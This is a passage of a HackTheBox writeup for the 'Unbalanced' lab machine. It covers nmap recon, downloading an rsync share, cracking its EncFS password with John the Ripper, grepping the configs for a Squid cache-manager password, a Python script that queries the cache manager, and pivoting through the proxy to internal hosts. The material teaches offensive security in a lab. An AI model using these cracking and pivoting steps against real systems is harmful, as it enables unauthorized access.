<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/assets/css/style.css?v=">
    
    
    <meta property="article:tag" content="hackthebox" />
    
    <meta property="article:tag" content="htb" />
    
    <meta property="article:tag" content="boot2root" />
    
    <meta property="article:tag" content="writeup" />
    
    <meta property="article:tag" content="linux" />
    
    <meta property="article:tag" content="unbalanced" />
    
    <meta property="article:tag" content="squid" />
    
    <meta property="article:tag" content="squid proxy" />
    
    <meta property="article:tag" content="rsync" />
    
    <meta property="article:tag" content="nfs" />
    
    <meta property="article:tag" content="encnfs" />
    
    <meta property="article:tag" content="encrypted nfs" />
    
    <meta property="article:tag" content="blind sql injection" />
    
    <meta property="article:tag" content="sql injection" />
    
    <meta property="article:tag" content="boolean-based sql injection" />
    
    <meta property="article:tag" content="pi-hole" />
    
    <meta property="article:tag" content="metasploit" />
    
    <meta property="article:tag" content="password reuse" />
        

    <meta name="twitter:card" content="summary"/>
    <meta name="twitter:title" content="HTB Unbalanced">
    <meta name="twitter:description" content="10.10.10.200 | 40 pts">
    <meta name="twitter:site" content="@jebidiah-anthony" />
    <meta name="twitter:creator" content="@feeeellliix">

    
    <meta property="og:image" content="https://jebidiah-anthony.github.io/boxes/screenshots/49_unbalanced/unbalanced.png" />
    

    
    <meta property="og:title" content="HTB Unbalanced" />
    

    <!-- Begin Jekyll SEO tag v2.6.1 -->
<title>HTB Unbalanced | jebidiah-anthony</title>
<meta name="generator" content="Jekyll v4.0.0" />
<meta property="og:title" content="HTB Unbalanced" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="10.10.10.200 40 pts" />
<meta property="og:description" content="10.10.10.200 40 pts" />
<link rel="canonical" href="https://jebidiah-anthony.github.io/boxes/49_Unbalanced.html" />
<meta property="og:url" content="https://jebidiah-anthony.github.io/boxes/49_Unbalanced.html" />
<meta property="og:site_name" content="jebidiah-anthony" />
<script type="application/ld+json">
{"description":"10.10.10.200 40 pts","headline":"HTB Unbalanced","@type":"WebPage","url":"https://jebidiah-anthony.github.io/boxes/49_Unbalanced.html","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


    <style>
      .user_host { color: green; }
      .sys_dir { color: #779ECB; }
      p { color:#aaa; }
      header { margin-bottom: 0px; }
      .header .navbtn {
	position: fixed;
	width: 0px;
	visibility: hidden;
      }
      .header .title { 
	padding-left: 69px;
	vertical-align: middle;
      }
      .header .title h2 { margin: 0; } 

      .container {
	max-width: 1200px;
      }
      .sidebar {
        border-right: 1px dashed #b5e853;
	bottom: 0;
        height: 100%;
	overflow: auto;
	padding: 10px 10px 10px 10px;
        position: fixed;
	top: 0;
        width: 230px;
      }
      .openbtn { 
	color:#b5e853;
	font-size:30px;
	cursor:pointer
      }
      .closebtn {
	color:#b5e853;
	font-size:69px;
	cursor:pointer;
	position:absolute;
	top:0;
	right:25px;
	font-size:36px;
	margin-left:50px;
	visibility:hidden;
      }
      
      .ctf_content {
        margin-left: 250px;
	padding-bottom: 5px;
      }
      .ctf_content h2 {	padding: 20px 0px 0px 10px; }
      .ctf_content h3 { margin: 20px 0px 0px 10px; }
      .ctf_content img {
 	display: block;
	margin-left: auto;
	margin-right: auto;
	max-width: 100%;
	padding: 0 10px 0 0;
      }
      .ctf_content table { padding: 0 15px; }

      #main_content h1 { padding: 20px 0px 0px 8px; }
      #main_content h2, p, pre { 
	padding-right:10px;
	padding-left:15px; 
      }
      #main_content h4 { 
        margin: 20px 0px 10px 0px; 
        padding-left: 25px; 
      }
      #main_content ol, ul { margin: 0 0 0 10px; }

      .highlighter-rouge { padding: 0 10px 0 10px; }

      .section-divider{
        border-bottom: 1.5px solid #b5e853;
        padding-top:28px;
        width:55%;
      }
      
      @media screen and (min-width: 801px) {
	.ctf_content {
          margin-left: 250px;
	  padding-bottom: 5px;
        }
      }
      @media screen and (max-width: 800px) {
        header {
	  background-color: #202020;
	  height: 80px;
	  padding: 0px 0 0 0;
	  position: fixed;
	  top: 0;
	}
        .header .navbtn {
          height: 80px;
	  padding: 18px 0 0 20px;
          visibility: visible;
	  width: 100px;
        }
	.header .title { padding-left: 100px; }
	.header .title h1 { padding-top: 5px; }
        .header .title h2 { margin: 0; }

	.container {
	  width:100%;
	}
	.sidebar {
          width: 0;
          z-index: 1;
          overflow-x: hidden;
	  padding: 0;
          transition: 0.5s;
	}
	.sidebar h2 { 
	  font-size: 18px; 
	  padding: 10px 10px 5px 10px;
	}
	.sidebar div { 
	  font-size: 15px; 
	  padding: 5px 10px 5px 10px;
	}
	.closebtn { visibility:visible; }

	.highlighter-rouge { padding: 0 0 0 0; }

	.ctf_content {
	  margin: 0;
	}
	.ctf_content h2 { padding: 15px 0px 0px 5px; }
        .ctf_content h3 { margin: 15px 10px 0px 15px; }
        .ctf_content img {
	  max-width: 100%;
	  padding: 0 10px 0 0;
        }
	.ctf_content table { 
	  margin: 0 10px 0px -8px;
	  min-width: 800px;
	}

        #main_content { margin-top:80px; }
	#main_content code { font-size: 15px; }
	#main_content h1 { font-size: 25px; }
	#main_content h2 { font-size: 22px; }
	#main_content h3 { font-size: 18px; }
	#main_content h4 { padding-left: 20px; }
	#main_content ol, ul {
	  font-size: 14px;
	  margin: 0 0 0 12px;
	  padding: 0 0 0 25px;
	}
	#main_content table { font-size: 14px; }
      }

      @media screen and (max-width: 480px) {
        header {
	  background-color: #202020;
	  height: 70px;
	  padding: 0px 0 0 0;
	  position: fixed;
	  top: 0;
	}
        .header .navbtn {
          height: 70px;
	  padding: 14px 0 0 18px;
        }
	.header .title { padding-left: 100px; }
	.header .title h1 { font-size:22px; }
        .header .title h2 { font-size:16px; }

	#main_content code { font-size: 13px; }
        #main_content ol, ul {
	  font-size: 13px;
	  margin: 0 0 0 12px;
	  padding: 0 0 0 25px;
	}
	#main_content table { font-size: 13px; }
      }
    </style>

  </head>

  <body>
    <div class="container">
       <div id="sidebar" class="sidebar">
         <span class="closebtn" onclick="closeNav()">&times;</span>      
	 <div><h2 style="margin-bottom:0; padding-top:20px">[SITE PAGES]</h2>

<div style="padding-top:10px">
  
  > <a href="/">whoami</a>
  
</div>
<div style="padding-top:10px">  
  >  <a href="/htb.html">
    
    <strong style="color:orange">htb writeups</strong>
    
  </a>
</div>
<div style="padding-top:10px">
  > <a href="/ctf.html">
    
    ctf writeups
    
  </a>
</div>
<div style="padding-top:10px">
  > <a href="/projects.html">
    
    projects
    
  </a>
</div>
</div>
	 <div style="padding-bottom:20px">
           
             <h2 style="margin-bottom:0; padding-top: 20px">[HTB BOXES]</h2>


<div style="padding-top:10px">
  
  > <strong style="color:orange">Unbalanced</strong>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/38_Bitlab.html">Bitlab</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/33_Safe.html">Safe</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/32_Ellingson.html">Ellingson</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/31_WriteUp.html">WriteUp</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/30_swagshop.html">swagshop</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/29_kryptos.html">kryptos</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/28_Luke.html">Luke</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/26_CTF.html">CTF</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/25_Friendzone.html">Friendzone</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/24_Flujab.html">Flujab</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/23_Help.html">Help</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/22_Chaos.html">Chaos</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/21_Lightweight.html">Lightweight</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/20_Irked.html">Irked</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/19_Teacher.html">Teacher</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/15_Mischief.html">Mischief</a>
  
</div>

<div style="padding-top:10px">
  
  > <a href="https://jebidiah-anthony.github.io/boxes/14_Waldo.html">Waldo</a>
  
</div>



	   
	 </div>
       </div>
       <div id="content" class="ctf_content">
	 <header>
           <div class="header">
             <div class="navbtn">
               <span class="openbtn" onclick="openNav()">&#9776;</span>
	     </div>
	     <div class="title">
               <h1>jebidiah-anthony</h1>
               <h2 style="padding:0 0 0 0">write-ups and what not</h2>
	     </div>
           </div>
         </header>
         <section id="main_content"><div class="paragraph">
<p><h1 style="color:red"> HTB Unbalanced (10.10.10.200) </h1></p>
</div>
<hr>
<hr>
<div class="sect1">
<h2 id="part-1-initial-recon">PART 1 : INITIAL RECON</h2>
<div class="sectionbody">
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>nmap <span class="nt">-oN</span> nmap.tcp.initial <span class="nt">--min-rate</span> 5000 <span class="nt">-p-</span> <span class="nt">-v</span> 10.10.10.200

  PORT     STATE SERVICE
  22/tcp   open  ssh
  873/tcp  open  rsync
  3128/tcp open  squid-http

<span class="nv">$ </span>nmap <span class="nt">-oN</span> nmap.tcp.unbalanced <span class="nt">-p</span> 22,873,3128 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-T4</span> 10.10.10.200

  PORT     STATE SERVICE    VERSION
  22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
  | ssh-hostkey:
  |   2048 a2:76:5c:b0:88:6f:9e:62:e8:83:51:e7:cf:bf:2d:f2 <span class="o">(</span>RSA<span class="o">)</span>
  |   256 d0:65:fb:f6:3e:11:b1:d6:e6:f7:5e:c0:15:0c:0a:77 <span class="o">(</span>ECDSA<span class="o">)</span>
  |_  256 5e:2b:93:59:1d:49:28:8d:43:2c:c1:f7:e3:37:0f:83 <span class="o">(</span>ED25519<span class="o">)</span>
  873/tcp  open  rsync      <span class="o">(</span>protocol version 31<span class="o">)</span>
  3128/tcp open  http-proxy Squid http proxy 4.6
  |_http-server-header: squid/4.6
  |_http-title: ERROR: The requested URL could not be retrieved
  Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel</code></pre>
</div>
</div>
</blockquote>
</div>
<hr>
</div>
</div>
<div class="sect1">
<h2 id="part-2-port-enumeration">PART 2 : PORT ENUMERATION</h2>
<div class="sectionbody">
<div class="paragraph">
<p><span style="color:orange"><strong><code>rsync</code></strong></span> seems to be open on port 873 and checking if there are any shared folders:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>rsync <span class="nt">-av</span> <span class="nt">--list-only</span> rsync://10.10.10.200

  conf_backups    EncFS-encrypted configuration backups</code></pre>
</div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>There is a shared folder named, <span style="color:orange"><strong><code>conf_backups</code></strong></span>, which based on the description is probably an encrypted file share but it contains config files so some sort of credentials might be lying around somewhere.</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>rsync <span class="nt">-av</span> rsync://10.10.10.200/conf_backups ./conf_backups

  receiving incremental file list
  ./
  ,CBjPJW4EGlcqwZW4nmVqBA6
  <span class="nt">-FjZ6-6</span>,Fa,tMvlDsuVAO7ek
  .encfs6.xml
  0K72OfkNRRx3-f0Y6eQKwnjn
  27FonaNT2gnNc3voXuKWgEFP4sE9mxg0OZ96NB0x4OcLo-
  2VyeljxHWrDX37La6FhUGIJS
  3E2fC7coj5,XQ8LbNXVX9hNFhsqCjD-g3b-7Pb5VJHx3C1
  3cdBkrRF7R5bYe1ZJ0KYy786
  3xB4vSQH-HKVcOMQIs02Qb9,
  4J8k09nLNFsb7S-JXkxQffpbCKeKFNJLk6NRQmI11FazC1
  5-6yZKVDjG4n-AMPD65LOpz6-kz,ae0p2VOWzCokOwxbt,
  5FTRnQDoLdRfOEPkrhM2L29P
  5IUA28wOw0wwBs8rP5xjkFSs
  6R1rXixtFRQ5c9ScY8MBQ1Rg
  7-dPsi7efZRoXkZ5oz1AxVd-Q,L05rofx0Mx8N2dQyUNA,
  7zivDbWdbySIQARaHlm3NbC-7dUYF-rpYHSQqLNuHTVVN1
  8CBL-MBKTDMgB6AT2nfWfq-e
  8XDA,IOhFFlhh120yl54Q0da
  8e6TAzw0xs2LVxgohuXHhWjM
  9F9Y,UITgMo5zsWaP1TwmOm8EvDCWwUZurrL0TwjR,Gxl0
  A4qOD1nvqe9JgKnslwk1sUzO
  Acv0PEQX8vs-KdK307QNHaiF
  B6J5M3OP0X7W25ITnaZX753T
  Chlsy5ahvpl5Q0o3hMyUIlNwJbiNG99DxXJeR5vXXFgHC1
  ECXONXBBRwhb5tYOIcjjFZzh
  F4F9opY2nhVVnRgiQ,OUs-Y0
  FGZsMmjhKz7CJ2r-OjxkdOfKdEip4Gx2vCDI24GXSF5eB1
  FSXWRSwW6vOvJ0ExPK0fXJ6F
  IymL3QugM,XxLuKEdwJJOOpi
  KPYfvxIoOlrRjTY18zi8Wne-
  Kb-,NDTgYevHOGdHCYsSQhhIHrUGjiM6i2JZcl,-PKAJm0
  Kpo3MHQxksW2uYX79XngQu-f
  KtFc,DR7HqmGdPOkM2CpLaM9
  Mv5TtpmUNnVl-fgqQeYAy8uu
  MxgjShAeN6AmkH2tQAsfaj6C
  Ni8LDatT134DF6hhQf5ESpo5
  Nlne5rpWkOxkPNC15SEeJ8g,
  OFG2vAoaW3Tvv1X2J5fy4UV8
  OvBqims-kvgGyJJqZ59IbGfy
  StlxkG05UY9zWNHBhXxukuP9
  TZGfSHeAM42o9TgjGUdOSdrd
  VQjGnKU1puKhF6pQG1aah6rc
  W5,ILrUB4dBVW-Jby5AUcGsz
  Wr0grx0GnkLFl8qT3L0CyTE6
  X93-uArUSTL,kiJpOeovWTaP
  Ya30M5le2NKbF6rD-qD3M-7t
  Yw0UEJYKN,Hjf-QGqo3WObHy
  Z8,hYzUjW0GnBk1JP,8ghCsC
  ZXUUpn9SCTerl0dinZQYwxrx
  ZvkMNEBKPRpOHbGoefPa737T
  a4zdmLrBYDC24s9Z59y-Pwa2
  c9w3APbCYWfWLsq7NFOdjQpA
  cwJnkiUiyfhynK2CvJT7rbUrS3AEJipP7zhItWiLcRVSA1
  dF2GU58wFl3x5R7aDE6QEnDj
  dNTEvgsjgG6lKBr8ev8Dw,p7
  gK5Z2BBMSh9iFyCFfIthbkQ6
  gRhKiGIEm4SvYkTCLlOQPeh-
  hqZXaSCJi-Jso02DJlwCtYoz
  iaDKfUAHJmdqTDVZsmCIS,Bn
  jIY9q65HMBxJqUW48LJIc,Fj
  kdJ5whfqyrkk6avAhlX-x0kh
  kheep9TIpbbdwNSfmNU1QNk-
  l,LY6YoFepcaLg67YoILNGg0
  lWiv4yDEUfliy,Znm17Al41zi0BbMtCbN8wK4gHc333mt,
  mMGincizgMjpsBjkhWq-Oy0D
  oPu0EVyHA6,KmoI1T,LTs83x
  pfTT,nZnCUFzyPPOeX9NwQVo
  pn6YPUx69xqxRXKqg5B5D2ON
  q5RFgoRK2Ttl3U5W8fjtyriX
  qeHNkZencKDjkr3R746ZzO5K
  sNiR-scp-DZrXHg4coa9KBmZ
  sfT89u8dsEY4n99lNsUFOwki
  uEtPZwC2tjaQELJmnNRTCLYU
  vCsXjR1qQmPO5g3P3kiFyO84
  waEzfb8hYE47wHeslfs1MvYdVxqTtQ8XGshJssXMmvOsZLhtJWWRX31cBfhdVygrCV5

  sent 1,452 bytes  received 411,990 bytes  28,513.24 bytes/sec
  total size is 405,603  speedup is 0.98</code></pre>
</div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>There are a lot of files but it still needs to be decrypted. One way to do this is by using <span style="color:orange"><strong><code>encfs2john</code></strong></span>:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>locate encfs

  /usr/share/john/encfs2john.py

<span class="nv">$ </span>python3 /usr/share/john/encfs2john.py ./conf_backups

  ./conf_backups:<span class="nv">$encfs$192</span><span class="k"><strong></span>580280<span class="k"></strong></span>0<span class="k"><strong></span>20<span class="k"></strong></span>99176a6e4d96c0b32bad9d4feb3d8e425165f105<span class="k"><strong></span>44<span class="k"></strong></span>1b2a580dea6cda1aedd96d0b72f43de132b239f51c224852030dfe8892da2cad329edc006815a3e84b887add

<span class="nv">$ </span>python3 /usr/share/john/encfs2john.py ./conf_backups <span class="o">&gt;</span> conf_backups.hash

<span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt conf_backups.hash

<span class="nv">$ </span>john <span class="nt">--show</span> conf_backups.hash

  ./conf_backups:bubblegum

  1 password <span class="nb">hash </span>cracked, 0 left

<span class="nv">$ </span><span class="nb">mkdir </span>conf_backups_dec

<span class="nv">$ </span>encfs <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>/conf_backups <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>/conf_backups_dec

  EncFS Password: bubblegum</code></pre>
</div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>Now that the files have been decrypted, the directory looks like this:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span><span class="nb">ls </span>conf_backups_dec

  50-localauthority.conf              hdparm.conf                      parser.conf
  50-nullbackend.conf                 host.conf                        protect-links.conf
  51-debian-sudo.conf                 initramfs.conf                   reportbug.conf
  70debconf                           input.conf                       resolv.conf
  99-sysctl.conf                      journald.conf                    resolved.conf
  access.conf                         kernel-img.conf                  rsyncd.conf
  adduser.conf                        ldap.conf                        rsyslog.conf
  bluetooth.conf                      ld.so.conf                       semanage.conf
  ca-certificates.conf                libaudit.conf                    sepermit.conf
  com.ubuntu.SoftwareProperties.conf  libc.conf                        sleep.conf
  dconf                               limits.conf                      squid.conf
  debconf.conf                        listchanges.conf                 sysctl.conf
  debian.conf                         logind.conf                      system.conf
  deluser.conf                        logrotate.conf                   time.conf
  dhclient.conf                       main.conf                        timesyncd.conf
  discover-modprobe.conf              mke2fs.conf                      ucf.conf
  dkms.conf                           modules.conf                     udev.conf
  dns.conf                            namespace.conf                   update-initramfs.conf
  dnsmasq.conf                        network.conf                     user.conf
  docker.conf                         networkd.conf                    user-dirs.conf
  fakeroot-x86_64-linux-gnu.conf      nsswitch.conf                    Vendor.conf
  framework.conf                      org.freedesktop.PackageKit.conf  wpa_supplicant.conf
  fuse.conf                           PackageKit.conf                  x86_64-linux-gnu.conf
  gai.conf                            pam.conf                         xattr.conf
  group.conf                          pam_env.conf</code></pre>
</div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>Since the files are now readable, we can begin searching for interesting information:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span><span class="nb">cd </span>conf_backups_dec

<span class="nv">$ </span><span class="nb">cat</span> <span class="k"><strong></span> | <span class="nb">grep</span> <span class="nt">-i</span> <span class="s2">"pass"</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"</span><span class="se">#</span><span class="s2">"</span>

  mozilla/Buypass_Class_2_Root_CA.crt
  mozilla/Buypass_Class_3_Root_CA.crt
  Reject-Type: password
  Name: passwords
  Accept-Type: password
  Filename: /var/cache/debconf/passwords.dat
  Stack: config, passwords
  passwd:         files systemd
  <span class="c"><mark>cachemgr_passwd Thah$Sh1</mark> menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events</span>
  cachemgr_passwd disable all

<span class="nv">$ </span><span class="nb">grep</span> <span class="nt">--with-filename</span> <span class="s2">"cachemgr_passwd"</span> <span class="k"></strong></span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"#"</span>

  squid.conf:cachemgr_passwd Thah<span class="nv">$Sh1</span> menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events
  squid.conf:cachemgr_passwd disable all</code></pre>
</div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>There is a password explicitly written in the <span style="color:orange"><strong><code>Squid Proxy</code></strong></span> config file. This makes sense being the name of the box is Unbalanced so this must be about a misconfigured load balancer or something as there is an <span style="color:orange"><strong><code>http proxy setup at port 3128</code></strong></span>.</p>
</div>
<div class="paragraph">
<p>What was also listed beside the <span style="color:orange"><strong><code>cachemgr_passwd</code></strong></span> password are the options we could explore in the Squid Proxy Cache Manager.</p>
</div>
<div class="paragraph">
<p>I wrote a simple python script in order to explore the cache manager:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="python"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">host</span> <span class="o">=</span> <span class="s">"10.10.10.200"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">3128</span>
<span class="n">req</span> <span class="o">=</span> <span class="s">"GET cache_object://{}:{}/{} HTTP/1.1</span><span class="se">\r\n</span><span class="s">"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>

<span class="n">username</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">password</span> <span class="o">=</span> <span class="s">"Thah$Sh1"</span>
<span class="n">creds</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="s">"{}:{}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">))</span>
<span class="n">auth</span> <span class="o">=</span> <span class="s">"Authorization: Basic {}</span><span class="se">\r\n</span><span class="s">"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">creds</span><span class="p">)[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>

<span class="n">http</span> <span class="o">=</span> <span class="s">"{}{}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">auth</span><span class="p">)</span>
<span class="n">squid</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"10.10.10.200"</span><span class="p">,</span> <span class="mi">3128</span><span class="p">)</span>
<span class="n">squid</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">http</span><span class="p">)</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">line</span> <span class="o">=</span> <span class="n">squid</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"unicode_escape"</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
        <span class="k">print</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span> <span class="k">break</span></code></pre>
</div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>And now checking what we could do and get:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>python3 squid.py menu | <span class="nb">grep </span>protected

  menu                   Cache Manager Menu                      protected
  pconn                  Persistent Connection Utilization Histograms    protected
  mem                    Memory Utilization                      protected
  diskd                  DISKD Stats                             protected
  fqdncache              FQDN Cache Stats and Contents           protected
  filedescriptors        Process Filedescriptor Allocation       protected
  objects                All Cache Objects                       protected
  vm_objects             In-Memory and In-Transit Objects        protected
  counters               Traffic and Resource Counters           protected
  5min                   5 Minute Average of Counters            protected
  60min                  60 Minute Average of Counters           protected
  histograms             Full Histogram Counts                   protected
  cbdata                 Callback Data Registry Contents         protected
  sbuf                   String-Buffer statistics                protected
  events                 Event Queue                             protected

<span class="nv">$ </span>python3 squid.py fqdncache

  <span class="o">[</span>...OMITTED...]
  Address                                       Flg TTL Cnt Hostnames
  127.0.1.1                                       H <span class="nt">-001</span>   2 unbalanced.htb unbalanced
  ::1                                             H <span class="nt">-001</span>   3 localhost ip6-localhost ip6-loopback
  172.31.179.2                                    H <span class="nt">-001</span>   1 intranet-host2.unbalanced.htb
  172.31.179.3                                    H <span class="nt">-001</span>   1 intranet-host3.unbalanced.htb
  127.0.0.1                                       H <span class="nt">-001</span>   1 localhost
  172.17.0.1                                      H <span class="nt">-001</span>   1 intranet.unbalanced.htb
  ff02::1                                         H <span class="nt">-001</span>   1 ip6-allnodes
  ff02::2                                         H <span class="nt">-001</span>   1 ip6-allrouters</code></pre>
</div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>There are three things interesting here&#8201;&#8212;&#8201;<span style="color:orange"><strong><code>intranet.unbalanced.htb</code></strong></span> (172.17.0.1), <span style="color:orange"><strong><code>intranet-host2.unbalanced.htb</code></strong></span> (172.31.179.2), and <span style="color:orange"><strong><code>intranet-host3.unbalanced.htb</code></strong></span> (172.31.179.3).</p>
</div>
<div class="paragraph">
<p>Opening <span style="color:orange"><strong><code>intranet.unbalanced.htb</code></strong></span> after setting up my proxy (Foxy Proxy) leads me to:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="imageblock">
<div class="content">
<img src="/boxes/screenshots/49_unbalanced/foxy_proxy.PNG" alt="Foxy Proxy">
</div>
<div class="title">Figure 1. <span style="color:orange"><em>Proxy Settings</em></span></div>
</div>
</blockquote>
</div>
<div class="quoteblock">
<blockquote>
<div class="imageblock">
<div class="content">
<img src="/boxes/screenshots/49_unbalanced/intranet_landing_page.png" alt="Landing Page">
</div>
<div class="title">Figure 2. <span style="color:orange"><em>Intranet Landing Page (<code>/intranet.php</code>)</em></span></div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>Examining the reponse headers using <code>curl</code>:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>curl <span class="nt">-I</span> <span class="nt">--proxy</span> <span class="s2">"http://10.10.10.200:3128"</span> http://172.17.0.1

  HTTP/1.1 302 Found
  Server: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
  Date: Sat, 05 Dec 2020 22:12:03 GMT
  Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
  Location: intranet.php
  Intranet-Host: intranet-host3.unbalanced.htb
  X-Cache: MISS from unbalanced
  X-Cache-Lookup: MISS from unbalanced:3128
  Via: 1.1 unbalanced <span class="o">(</span>squid/4.6<span class="o">)</span>
  Connection: keep-alive</code></pre>
</div>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>The internal load balancer will either bring you to <span style="color:orange"><strong><code>intranet-host2</code></strong></span> or <span style="color:orange"><strong><code>intranet-host3</code></strong></span> which contains a login form and a contact form which doesn&#8217;t seem to do anything when you submit entries or fail to login.</p>
</div>
<div class="paragraph">
<p>But then you&#8217;ll notice something missing&#8230;&#8203; what happened to <span style="color:orange"><strong><code>intranet-host1</code></strong></span>? Since <span style="color:orange">host2</span> is at <span style="color:orange">172.31.179.2</span> and <span style="color:orange">host3</span> is at <span style="color:orange">172.31.179.3</span>, maybe it&#8217;s at <span style="color:orange">172.31.179.1</span>.</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>curl <span class="nt">-I</span> <span class="nt">--proxy</span> <span class="s2">"http://10.10.10.200:3128"</span> http://172.31.179.1

  HTTP/1.1 200 OK
  Server: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
  Date: Sat, 05 Dec 2020 22:38:45 GMT
  Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
  Intranet-Host: <span class="c"><mark>intranet-host1.unbalanced.htb</mark></span>
  X-Cache: MISS from unbalanced
  X-Cache-Lookup: MISS from unbalanced:3128
  Via: 1.1 unbalanced <span class="o">(</span>squid/4.6<span class="o">)</span>
  Connection: keep-alive

<span class="nv">$ </span>curl <span class="nt">--proxy</span> <span class="s2">"http://10.10.10.200:3128"</span> http://172.31.179.1

  Host temporarily taken out of load balancing <span class="k">for </span>security maintenance.</code></pre>
</div>
</div>
</blockquote>
</div>
